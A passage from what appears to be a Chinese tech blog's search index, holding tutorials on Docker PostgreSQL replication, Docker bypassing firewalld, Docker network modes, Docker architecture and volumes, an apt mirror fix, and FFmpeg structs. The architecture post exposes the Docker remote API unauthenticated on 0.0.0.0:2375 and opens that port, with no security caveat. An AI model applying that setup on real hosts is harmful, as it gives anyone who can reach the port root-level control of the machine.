cfcd208495d565ef66e7dff9f98764da 7 | cfcd208495d565ef66e7dff9f98764da 8 | cfcd208495d565ef66e7dff9f98764da 9 | cfcd208495d565ef66e7dff9f98764da 10 | cfcd208495d565ef66e7dff9f98764da (10 rows) 从机查看数据 1 2 3 # 进入从机容器 docker exec -it slave bash psql -U postgres 1 2 3 4 5 6 7 8 9 10 11 12 13 -- 查看数据库 \\d List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+------------+------------+----------------------- postgres | postgres | UTF8 | en_US.utf8 | en_US.utf8 | template0 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.utf8 | en_US.utf8 | =c/postgres + | | | | | postgres=CTc/postgres test | postgres | UTF8 | en_US.utf8 | en_US.utf8 | (4 rows) 1 2 3 4 5 6 7 8 -- 查看表 \\c test List of relations Schema | Name | Type | Owner --------+------+-------+---------- public | test | table | postgres (1 row) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 -- 查看所有数据 select * from test; id | value ----+---------------------------------- 1 | cfcd208495d565ef66e7dff9f98764da 2 | cfcd208495d565ef66e7dff9f98764da 3 | cfcd208495d565ef66e7dff9f98764da 4 | cfcd208495d565ef66e7dff9f98764da 5 | cfcd208495d565ef66e7dff9f98764da 6 | cfcd208495d565ef66e7dff9f98764da 7 | cfcd208495d565ef66e7dff9f98764da 8 | cfcd208495d565ef66e7dff9f98764da 9 | cfcd208495d565ef66e7dff9f98764da 10 | cfcd208495d565ef66e7dff9f98764da (10 rows) 可以发现主从数据一直，代表我们主从配置成功！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/docker-%E9%85%8D%E7%BD%AE-postgresql-%E7%9A%84%E4%B8%BB%E4%BB%8E%E7%8E%AF%E5%A2%83/","title":"Docker 配置 PostgreSQL 的主从环境"},{"content":"Docker 绕过了 firewalld 的问题 前言 我们的 firewalld 上没有开放该端口，但是在使用 Docker 的端口映射后我们就能够通过外网访问到该端口。\n原因 默认情况下当Docker启动容器映射端口时，会直接在iptables添加规则开启添加端口。而 firewalld 实际上也是在iptables写入规则。因此 firewalld和docker属于是同级的应用，但是firewalld不会去检测 docker 写入的规则，就会导致 docker 可以开启firewalld没有允许的端口：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # 首先关闭 docker 和防火墙 systemctl stop docker systemctl stop firewalld # 查看 iptables iptables --list Chain INPUT (policy ACCEPT) target prot opt source destination Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination # 打开 docker systemctl start docker iptables --list # 我们会发现在 iptables 里增加了许多 docker 的规则 # 我们启动一个容器并开启端口映射 docker run -dit -p 80:80 nginx iptables --list # 我们发现在 iptables 里增加了一条规则 # 它将 80(http) 端口的流量转发到了 172.17.0.2(我们开启的容器的地址) ... Chain DOCKER (1 references) target prot opt source destination ACCEPT tcp -- anywhere 172.17.0.2 tcp dpt:http ... 通过上面的分析我们就知道了 docker 是通过在 iptables 中添加规则实现的端口映射。\n那这个时候我们再开启防火墙，看看防火墙是如何修改的 iptables：\n1 2 3 4 5 6 7 8 9 10 11 # 开启防火墙观察 iptables 的变化 systemctl start firewalld iptables --list ... Chain IN_public_allow (1 references) target prot opt source destination ACCEPT tcp -- anywhere anywhere tcp dpt:ssh ctstate NEW,UNTRACKED ACCEPT tcp -- anywhere anywhere tcp dpt:ssh ctstate NEW,UNTRACKED ACCEPT tcp -- anywhere anywhere tcp dpt:postgres ctstate NEW,UNTRACKED ... 开启防火墙后我们果然发现了我们通过 firewalld开启的端口规则。这下子我们终于弄懂了 docker 和 firewalld 之间的关系。\n等等！！！\n我们之前看到的 docker 的规则呢？\n开启防火墙后我们发现在上面添加的 docker 的 iptables 的规则已经不见了，这个时候从外网访问 80 端口也被拒绝了！这又是怎么一回事呢？\n原来 firewalld在开启时会自动刷新覆盖掉原来的 iptables 规则，这就导致了 docker 的规则被丢失。\n因此 firewalld重启后需要再重启 docker的服务才能使 docker 正常启动。\n使 docker 在防火墙规则下工作 由于 docker 这种脱离防火墙控制的行为具有一定危险性，并且为运维带来一定难度，因此我们需要让 docker 接受防火墙的管理。\n既然 docker 是修改的 iptables 脱离的防火墙控制，那我们让他不修改 iptables 就可以解决问题了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 添加规则 vim /etc/docker/daemon.json { ... \u0026#34;experimental\u0026#34; : true, \u0026#34;iptables\u0026#34;: false } # 重启 docker systemctl daemon-reload systemctl restart docker # 启动一个容器检验 docker run -d -p 80:80 nginx iptables --list # 发现 docker 没有添加规则 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/docker-%E7%BB%95%E8%BF%87%E4%BA%86-firewalld-%E7%9A%84%E9%97%AE%E9%A2%98/","title":"Docker 绕过了 firewalld 的问题"},{"content":"Docker 四种网络模型 一、简介 为了满足使 Docker 满足复杂业务场景下的网络需求，我们有必要深入了解 Docker 的网络知识，探索 Docker 的多种网络模型。\nDocker 的网络模型主要有四种：\nBridge 模式：是 Docker 的默认网络模式，可以使用 –net=bridge 指定； Host 模式：使用 –net=host 指定； Container 模式：使用 –net=container: 容器名称或ID 指定； None 模式：使用 –net=none 指定。 下面让我们详细了解一下这几种不同的网络模式！\n二、Bridge 模式 Bridge 模式是 Docker 默认使用的网络模式。当 Docker 启动时，会自动在主机上创建一个 docker0 虚拟网桥，实际上是 Linux 的一个 bridge，可以理解为一个软件交换机。它会在挂载到它的网口之间进行转发。\n1 2 3 4 5 6 7 8 9 10 11 # 查看本机网络配置 ip addr ... docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default link/ether 02:42:51:82:92:0a brd ff:ff:ff:ff:ff:ff inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 valid_lft forever preferred_lft forever inet6 fe80::42:51ff:fe82:920a/64 scope link valid_lft forever preferred_lft forever ... Docker 随机分配一个本地未占用的私有网段，这里是 172.17.0.1，掩码为 255.255.0.0。此后启动的容器内的网口也会自动分配一个同一网段（172.17.0.0/16）的地址。\n当创建一个 Docker 容器的时候，同时会创建了一对 veth pair 接口（当数据包发送到一个接口时，另外一个接口也可以收到相同的数据包）。这对接口一端在容器内，即 eth0；另一端在本地并被挂载到 docker0 网桥，名称以 veth 开头：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 启动一个容器 docker run -dit ubuntu # 查看网络配置 ip addr ... vethc51f579@if9: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue master docker0 state UP group default link/ether 5e:fd:53:cc:54:58 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::5cfd:53ff:fecc:5458/64 scope link valid_lft forever preferred_lft forever # 进入容器 docker exec -it {{ID}} bash # 安装 net-tools apt-get update apt-get install net-tools # 查看网络配置 ifconfig ... eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.17.0.2 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:ac:11:00:02 txqueuelen 0 (Ethernet) RX packets 2452 bytes 13783808 (13.7 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2012 bytes 152399 (152.3 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 通过这种方式，主机可以跟容器通信，容器之间也可以相互通信。Docker 就创建了在主机和所有容器之间一个虚拟共享网络：\n三、Host 模式 Docker 为了实现网络的隔离，使用了 Network Namespace 对网络进行隔离。但如果启动容器的时候使用host模式，那么这个容器将不会获得一个独立的 Network Namespace，而是和宿主机共用一个 Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的 IP 和端口。\n1 2 3 4 5 6 7 8 9 # 查看最开始的网络配置 ip addr # 以host模式启动一个容器 docker run -dit -p 80:80 --net host nginx # 查看网络配置 ip addr # 未发现多出 veth 接口，网络配置与之前没有任何区别 而外界访问容器中的应用，则直接使用 主机IP:80 即可，不用任何NAT转换，就如直接跑在宿主机中一样。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。\n四、Container 模式 Container 模式指定新创建的容器和已经存在的一个容器共享一个 Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的IP，而是和一个指定的容器共享IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。\n1 2 3 4 5 6 7 8 # 以默认模式一个容器 docker run -dit --name u1 ubuntu # 以 container 模式启动另一个容器 docker run -dit --name u2 --network container:u1 ubuntu # 查看网络配置 ifconfig # 发现只多了一个 veth 五、None 模式 此模式下容器不参与网络通信，运行于此类容器中的进程仅能访问本地环回接口，仅适用于进程无须网络通信的场景中，例如备份，进程诊断及各种离线任务等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 以 None 模式运行一个容器 docker run -dit --network none ubuntu # 进入容器查看 ifconfig # 只有 lo 网卡 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 29 bytes 2569 (2.5 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 29 bytes 2569 (2.5 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 参考资料：\n高级网络配置 | Docker 从入门到实践 (docker-practice.com) docker容器的四种网络模型_xbw_linux123的博客-CSDN博客_docker 网络模型 Docker的docker0网络 - Kit_L - 博客园 (cnblogs.com) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/docker-%E5%9B%9B%E7%A7%8D%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B/","title":"Docker 四种网络模型"},{"content":"Docker 系统架构与使用 一、整体架构 通过下图可以发现，Docker 系统主要包含客户端、服务端和仓库三大部分。\nDocker 在运行时分为 Docker 引擎（服务端守护进程） 和 客户端工具，我们日常使用各种 docker 命令，其实就是在使用 客户端工具 与 Docker 引擎 进行交互： 二、Client Docker 是一个客户端-服务器（C/S）架构程序。Docker 客户端只需要向 Docker 服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。\nClient 能够帮助我们使用命令行与 Docker 服务端进行交互，包括本地服务端和远程服务端：\n通过-H参数可以指定客户端连接的服务端。\n1 docker -H host 三、服务端（Docker 引擎） 服务端会启动一个守护进程，通过 socket 或者 RESTful API 接收来自客户端的请求，并且处理这些请求，实现对镜像和容器的操作。\n镜像 Docker 镜像 是一个特殊的文件系统，它除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。\n镜像 不包含 任何动态数据，其内容在构建之后也不会被改变。\n因为镜像包含了完整的 root 文件系统，因此其体积往往是巨大的。为了解决这个问题，采用了 Union FS (opens new window)的技术，将其设计为分层存储的架构，由多层文件系统联合组成：\n容器 镜像Image和容器Container的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。\n容器的实质是进程，但与直接在宿主执行的进程不同，容器进程运行于属于自己的独立的命名空间。因此容器可以拥有自己的 root 文件系统、自己的网络配置、自己的进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。\n容器与镜像层一样也是分层结构的。每一个容器运行时，都是是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为 容器存储层。\n容器存储层的生存周期和容器一样，容器消亡时，容器存储层也随之消亡。因此，任何保存于容器存储层的信息都会随容器删除而丢失。容器不应该向其存储层内写入任何数据，容器存储层要保持无状态化。\n所有的文件写入操作，都应该使用 数据卷（Volume）、或者 绑定宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更高。\n开放远程 API 接口 我们知道客户端是调用服务端的 API 接口实现对镜像和容器的管理。Docker 可以监听并处理 3 种 socket 形式的 API 请求，分别是unix（unix 域协议）、tcp（tcp 协议）和fd。\n一般来说，在安装好 docker 后，默认就已经开启了unix socket，并且我们在执行需要有root权限或者docker用户组成员才有权限访问。\n下面是通过 socket 文件与服务端通信：\n1 curl --unix-socket /var/run/docker.sock http://docker/version 输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 { \u0026#34;Platform\u0026#34;:{ \u0026#34;Name\u0026#34;:\u0026#34;Docker Engine - Community\u0026#34; }, \u0026#34;Components\u0026#34;:[ { \u0026#34;Name\u0026#34;:\u0026#34;Engine\u0026#34;, \u0026#34;Version\u0026#34;:\u0026#34;20.10.8\u0026#34;, \u0026#34;Details\u0026#34;:{ \u0026#34;ApiVersion\u0026#34;:\u0026#34;1.41\u0026#34;, \u0026#34;Arch\u0026#34;:\u0026#34;amd64\u0026#34;, \u0026#34;BuildTime\u0026#34;:\u0026#34;2021-07-30T19:54:13.000000000+00:00\u0026#34;, \u0026#34;Experimental\u0026#34;:\u0026#34;true\u0026#34;, \u0026#34;GitCommit\u0026#34;:\u0026#34;75249d8\u0026#34;, \u0026#34;GoVersion\u0026#34;:\u0026#34;go1.16.6\u0026#34;, \u0026#34;KernelVersion\u0026#34;:\u0026#34;3.10.0-1160.41.1.el7.x86_64\u0026#34;, \u0026#34;MinAPIVersion\u0026#34;:\u0026#34;1.12\u0026#34;, \u0026#34;Os\u0026#34;:\u0026#34;linux\u0026#34; } }, { \u0026#34;Name\u0026#34;:\u0026#34;containerd\u0026#34;, \u0026#34;Version\u0026#34;:\u0026#34;1.4.9\u0026#34;, \u0026#34;Details\u0026#34;:{ \u0026#34;GitCommit\u0026#34;:\u0026#34;e25210fe30a0a703442421b0f60afac609f950a3\u0026#34; } }, { \u0026#34;Name\u0026#34;:\u0026#34;runc\u0026#34;, \u0026#34;Version\u0026#34;:\u0026#34;1.0.1\u0026#34;, \u0026#34;Details\u0026#34;:{ \u0026#34;GitCommit\u0026#34;:\u0026#34;v1.0.1-0-g4144b63\u0026#34; } }, { \u0026#34;Name\u0026#34;:\u0026#34;docker-init\u0026#34;, \u0026#34;Version\u0026#34;:\u0026#34;0.19.0\u0026#34;, \u0026#34;Details\u0026#34;:{ \u0026#34;GitCommit\u0026#34;:\u0026#34;de40ad0\u0026#34; } } ], \u0026#34;Version\u0026#34;:\u0026#34;20.10.8\u0026#34;, \u0026#34;ApiVersion\u0026#34;:\u0026#34;1.41\u0026#34;, \u0026#34;MinAPIVersion\u0026#34;:\u0026#34;1.12\u0026#34;, \u0026#34;GitCommit\u0026#34;:\u0026#34;75249d8\u0026#34;, \u0026#34;GoVersion\u0026#34;:\u0026#34;go1.16.6\u0026#34;, \u0026#34;Os\u0026#34;:\u0026#34;linux\u0026#34;, \u0026#34;Arch\u0026#34;:\u0026#34;amd64\u0026#34;, \u0026#34;KernelVersion\u0026#34;:\u0026#34;3.10.0-1160.41.1.el7.x86_64\u0026#34;, \u0026#34;Experimental\u0026#34;:true, \u0026#34;BuildTime\u0026#34;:\u0026#34;2021-07-30T19:54:13.000000000+00:00\u0026#34; } 开放远程 API\n修改 docker 守护进程的配置文件/lib/systemd/system/docker.service\n对下面这行进行修改：\nExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock 修改为：\nExecStart=/usr/bin/dockerd -H unix://var/run/docker.sock -H tcp://0.0.0.0:2375 修改完成后重新加载：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 重载 docker 服务 systemctl daemon-reload # 重新加载守护进程配置 systemctl restart docker.service # 重启 docker 服务 # 查看 docker 进程 ps -ef|grep docker output: root 3701 1 0 01:07 ? 00:00:00 /usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375 --containerd=/run/containerd/containerd.sock root 3834 2449 0 01:11 pts/0 00:00:00 grep --color=auto docker # 开放防火墙2375端口 firewall-cmd --zone=public --add-port=2375/tcp --permanent\t# 开放2375端口 firewall-cmd --reload\t# 重载防火墙 firewall-cmd --list-all\t# 查看开放端口 # 访问 curl http://{{ip}}:2375/version 数据管理 在上面的学习中我们了解到容器中的数据会随着容器生命周期的结束而消失。如果我们希望保存数据，那么就需要使用 数据卷（Volume）、或者 绑定宿主目录，在这些位置的读写会跳过容器存储层，直接对宿主（或网络存储）发生读写，其性能和稳定性更高。\n数据卷（Volume）\n数据卷是一个可供一个或多个容器使用的特殊目录，它绕过 UFS，可以提供很多有用的特性：\n数据卷可以在容器之间共享和重用； 对数据卷的修改会立马生效； 对数据卷的更新，不会影响镜像； 数据卷默认会一直存在，即使容器被删除。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # 创建一个数据卷 docker volume create my-vol # 查看所有数据卷 docker volume ls DRIVER VOLUME NAME local my-vol # 查看数据卷的详细信息 docker volume inspect my-vol [ { \u0026#34;CreatedAt\u0026#34;: \u0026#34;2021-09-09T02:04:14+08:00\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Labels\u0026#34;: {}, \u0026#34;Mountpoint\u0026#34;: \u0026#34;/var/lib/docker/volumes/my-vol/_data\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;my-vol\u0026#34;, \u0026#34;Options\u0026#34;: {}, \u0026#34;Scope\u0026#34;: \u0026#34;local\u0026#34; } ] 在用 docker run 命令的时候，使用 --mount 标记来将 数据卷 挂载到容器里。在一次 docker run 中可以挂载多个 数据卷。下面创建一个名为 web 的容器，并加载一个 数据卷 到容器的 /usr/share/nginx/html 目录：\n1 2 3 4 5 # 拉取nginx的镜像 docker pull nginx # 启动容器加载数据卷 docker run -d -p 80:80 --name web --mount source=my-vol,target=/usr/share/nginx/html nginx 在主机里使用以下命令可以查看 web 容器的信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 docker inspect web ... \u0026#34;Mounts\u0026#34;: [ { \u0026#34;Type\u0026#34;: \u0026#34;volume\u0026#34;, \u0026#34;Name\u0026#34;: \u0026#34;my-vol\u0026#34;, \u0026#34;Source\u0026#34;: \u0026#34;/var/lib/docker/volumes/my-vol/_data\u0026#34;, \u0026#34;Destination\u0026#34;: \u0026#34;/usr/share/nginx/html\u0026#34;, \u0026#34;Driver\u0026#34;: \u0026#34;local\u0026#34;, \u0026#34;Mode\u0026#34;: \u0026#34;z\u0026#34;, \u0026#34;RW\u0026#34;: true, \u0026#34;Propagation\u0026#34;: \u0026#34;\u0026#34; } ], ... 对容器内指定目录进行文件写入操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 查看容器 docker container ls # 进入容器 docker exec -it {{ID}} bash # 写入文件 echo Hello World!\u0026gt;/usr/share/nginx/html/testFile # 退出容器 exit # 根据docker inspect web查询到的路径在主机查看文件 cat /var/lib/docker/volumes/my-vol/_data/testFile Hello World 由于数据卷是被设计用来持久化数据的，它的生命周期独立于容器，因此 Docker 不会在容器被删除后自动删除数据卷，并且也不存在垃圾回收这样的机制来处理没有任何容器引用的数据。\n使用下面命令删除数据卷：\n1 2 3 4 5 # 删除指定数据卷 docker volume rm my-vol # 清理无主数据卷 docker volume prune 挂载主机目录\n为了使数据持久化，我们也可以选择将主机目录挂载到容器内。使用 --mount 标记可以指定挂载一个本地主机的目录到容器中去。\nDocker 挂载主机目录的默认权限是 读写，用户也可以通过增加 readonly 指定为 只读，加了 readonly 之后，就挂载为 只读 了：\n1 docker run -d -P --name web --mount type=bind,source=/src/webapp,target=/usr/share/nginx/html,readonly nginx --mount 标记也可以从主机挂载单个文件到容器中。\n四、Registry 仓库 镜像构建完成后，可以很容易的在当前宿主机上运行，但是，如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry 就是这样的服务。\nDocker 用 Registry 来保存用户构建的镜像。Registry 分为公共和私有两种。一个 Docker Registry 中可以包含多个 仓库（Repository）；每个仓库可以包含多个 标签（Tag）；每个标签对应一个镜像。Docker 公司运营公共的 Registry 叫做 Docker Hub。用户可以在 Docker Hub 注册账号，分享并保存自己的镜像。\n参考资料：\n[Docker 架构及工作原理 - 哈喽沃德先生 - 博客园 (cnblogs.com)](https://www.cnblogs.com/mrhelloworld/p/docker2.html#:~:text=Docker 是一个客户端-服务器（C%2FS）架构程序。. Docker 客户端只需要向 Docker 服务器或者守护进程发出请求，服务器或者守护进程将完成所有工作并返回结果。. Docker 提供了一个命令行工具,API。. 你可以在同一台宿主机上运行 Docker 守护进程和客户端，也可以从本地的 Docker 客户端连接到运行在另一台宿主机上的远程 Docker 守护进程。.) Docker — 从入门到实践 | Docker 从入门到实践 (docker-practice.com) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/docker-%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/","title":"Docker 系统架构"},{"content":"在在 Dockerfile 中执行命令\n1 RUN apt-get update \u0026amp;\u0026amp; apt-get upgrade -y \u0026amp;\u0026amp; apt-get autoremove -y 时出现 Hash Sum mismatch 问题。\n此时需要进行换源，当前我换为中科大源：\n1 RUN sed -i s@/archive.ubuntu.com/@/mirrors.ustc.edu.cn/@g /etc/apt/sources.list \u0026amp;\u0026amp; apt-get update 换源之后问题解决。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/docker%E4%B8%ADapt-get-update%E5%87%BA%E9%94%99hash-sum-mismatch/","title":"docker中apt-get update出错hash sum mismatch"},{"content":"FFmpeg 中常用结构体 本文参考了雷神的讲解，再加上一些自己的查找。总结了一下自己开发时常用的结构体的属性及用途，方便自己后面查询使用。由于自己使用的FFmpeg版本为 4.3.1，因此可能会和雷神的有一些出入，具体细节大家可以参看官方文档。\n雷神的原文：FFMPEG中最关键的结构体之间的关系\n结构体之间的关系 解封装 AVOutputFormat 主要功能：保存了输出格式（MP4、flv等）的信息和一些常规设置。\n主要信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const char *name; const char *long_name;//格式的描述性名称，易于阅读。 enum AVCodecID audio_codec; //默认的音频编解码器 enum AVCodecID video_codec; //默认的视频编解码器 enum AVCodecID subtitle_codec; //默认的字幕编解码器 struct AVOutputFormat *next; int (*write_header)(struct AVFormatContext *); int (*write_packet)(struct AVFormatContext *, AVPacket *pkt);//写一个数据包。 如果在标志中设置AVFMT_ALLOW_FLUSH，则pkt可以为NULL。 int (*write_trailer)(struct AVFormatContext *); int (*interleave_packet)(struct AVFormatContext *, AVPacket *out, AVPacket *in, int flush); int (*control_message)(struct AVFormatContext *s, int type, void *data, size_t data_size);//允许从应用程序向设备发送消息。 int (*write_uncoded_frame)(struct AVFormatContext *, int stream_index, AVFrame **frame, unsigned flags);//写一个未编码的AVFrame。 int (*init)(struct AVFormatContext *);//初始化格式。 可以在此处分配数据，并设置在发送数据包之前需要设置的任何AVFormatContext或AVStream参数。 void (*deinit)(struct AVFormatContext *);//取消初始化格式。 int (*check_bitstream)(struct AVFormatContext *, const AVPacket *pkt);//设置任何必要的比特流过滤，并提取全局头部所需的任何额外数据。 AVFormatContext 主要功能：描述了一个媒体文件或媒体流的构成和基本信息\n主要信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 struct AVInputFormat *iformat;//输入数据的封装格式。仅解封装用，由avformat_open_input()设置 struct AVOutputFormat *oformat;//输出数据的封装格式。仅封装用，调用者在avformat_write_header()之前设置 AVIOContext *pb; // I/O上下文 // 解封装：由用户在avformat_open_input()之前设置（然后用户必须手动关闭它）或通过avformat_open_input()设置 // 封装：由用户在avformat_write_header()之前设置。 调用者必须注意关闭/释放IO上下文 unsigned int nb_streams;//AVFormatContext.streams中元素的个数 AVStream **streams;//文件中所有流的列表 char filename[1024];//输入输出文件名 int64_t start_time;//第一帧的位置 int64_t duration;//流的持续时间 int64_t bit_rate;//总流比特率（bit / s），如果不可用则为0。 int64_t probesize;//从输入读取的用于确定输入容器格式的数据的最大大小。仅封装用，由调用者在avformat_open_input()之前设置。 AVDictionary *metadata;//元数据 AVCodec *video_codec;//视频编解码器 AVCodec *audio_codec;//音频编解码器 AVCodec *subtitle_codec;//字母编解码器 AVCodec *data_codec;//数据编解码器 int (*io_open)(struct AVFormatContext *s, AVIOContext **pb, const char *url, int flags, AVDictionary **options);//打开IO stream的回调函数。 void (*io_close)(struct AVFormatContext *s, AVIOContext *pb);//关闭使用AVFormatContext.io_open()打开的流的回调函数 解码 AVStream 主要功能：存储每一个视频/音频流信息 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 int index; //在AVFormatContext中的索引，这个数字是自动生成的，可以通过这个数字从AVFormatContext::streams表中索引到该流。 int id;//流的标识，依赖于具体的容器格式。解码：由libavformat设置。编码：由用户设置，如果未设置则由libavformat替换。 AVCodecContext *codec;//指向该流对应的AVCodecContext结构，调用avformat_open_input时生成。 AVRational time_base;//这是表示帧时间戳的基本时间单位（以秒为单位）。该流中媒体数据的pts和dts都将以这个时间基准为粒度。 int64_t start_time;//流的起始时间，以流的时间基准为单位。如需设置，100％确保你设置它的值真的是第一帧的pts。 int64_t duration;//解码：流的持续时间。如果源文件未指定持续时间，但指定了比特率，则将根据比特率和文件大小估计该值。 int64_t nb_frames; //此流中的帧数（如果已知）或0。 enum AVDiscard discard;//选择哪些数据包可以随意丢弃，不需要去demux。 AVRational sample_aspect_ratio;//样本长宽比（如果未知，则为0）。 AVDictionary *metadata;//元数据信息。 AVRational avg_frame_rate;//平均帧速率。解封装：可以在创建流时设置为libavformat，也可以在avformat_find_stream_info（）中设置。封装：可以由调用者在avformat_write_header（）之前设置。 AVPacket attached_pic;//附带的图片。比如说一些MP3，AAC音频文件附带的专辑封面。 int probe_packets;//编解码器用于probe的包的个数。 int codec_info_nb_frames;//在av_find_stream_info（）期间已经解封装的帧数。 int request_probe;//流探测状态，1表示探测完成，0表示没有探测请求，rest 执行探测。 int skip_to_keyframe;//表示应丢弃直到下一个关键帧的所有内容。 int skip_samples;//在从下一个数据包解码的帧开始时要跳过的采样数。 int64_t start_skip_samples;//如果不是0，则应该从流的开始跳过的采样的数目。 int64_t first_discard_sample;//如果不是0，则应该从流中丢弃第一个音频样本。 int64_t pts_reorder_error[MAX_REORDER_DELAY+1]; uint8_t pts_reorder_error_count[MAX_REORDER_DELAY+1];//内部数据，从pts生成dts。 int64_t last_dts_for_order_check; uint8_t dts_ordered; uint8_t dts_misordered;//内部数据，用于分析dts和检测故障mpeg流。 AVRational display_aspect_ratio;//显示宽高比。 AVCodecContext 主要功能：存储该视频/音频流使用解码方式的相关数据 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 enum AVMediaType codec_type; //编解码器的类型（视频，音频...）。 const struct AVCodec *codec; //采用的解码器AVCodec（H.264,MPEG2...）。 int64_t bit_rate;//平均比特率。 uint8_t *extradata;//针对特定编码器包含的附加信息（例如对于H.264解码器来说，存储SPS，PPS等）。 int extradata_size; AVRational time_base;//时间的基准单位，根据该参数，可以把PTS转化为实际的时间（单位为秒s）。 编解码延迟。 int delay;//编码：从编码器输入到解码器输出的帧延迟数。解码：除了规范中规定的标准解码器外产生的帧延迟数。 int width, height;//代表宽和高（仅视频）。 int refs;//运动估计参考帧的个数（H.264的话会有多帧，MPEG2这类的一般就没有了）。 int sample_rate; //采样率（仅音频）。 int channels; //声道数（仅音频）。 enum AVSampleFormat sample_fmt; //音频采样格式，编码：由用户设置。解码：由libavcodec设置。 int frame_size;//音频帧中每个声道的采样数。编码：由libavcodec在avcodec_open2（）中设置。 解码：可以由一些解码器设置以指示恒定的帧大小. int frame_number;//帧计数器，由libavcodec设置。解码：从解码器返回的帧的总数。编码：到目前为止传递给编码器的帧的总数。 uint64_t channel_layout;//音频声道布局。编码：由用户设置。解码：由用户设置，可能被libavcodec覆盖。 enum AVAudioServiceType audio_service_type;//音频流传输的服务类型。编码：由用户设置。解码：由libavcodec设置。 AVCodec 主要功能：存储编解码器信息 主要信息： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const char *name;//编解码器的名字，比较短。在编码器和解码器之间是全局唯一的。 这是用户查找编解码器的主要方式 const char *long_name;//编解码器的名字，全称，比较长 enum AVMediaType type;//指明了类型，是视频，音频，还是字幕 enum AVCodecID id; const AVRational *supported_framerates;//支持的帧率（仅视频） const enum AVPixelFormat *pix_fmts;//支持的像素格式（仅视频） const int *supported_samplerates;//支持的采样率（仅音频） const enum AVSampleFormat *sample_fmts;//支持的采样格式（仅音频） const uint64_t *channel_layouts;//支持的声道数（仅音频） int priv_data_size;//私有数据的大小 void (*init_static_data)(struct AVCodec *codec);//初始化编解码器静态数据，从avcodec_register（）调用 int (*encode2)(AVCodecContext *avctx, AVPacket *avpkt, const AVFrame *frame, int *got_packet_ptr);//将数据编码到AVPacket int (*decode)(AVCodecContext *, void *outdata, int *outdata_size, AVPacket *avpkt);//解码数据到AVPacket int (*close)(AVCodecContext *);//关闭编解码器。 void (*flush)(AVCodecContext *);//刷新缓冲区。当seek时会被调用 关系 graph TD A[AVStream] 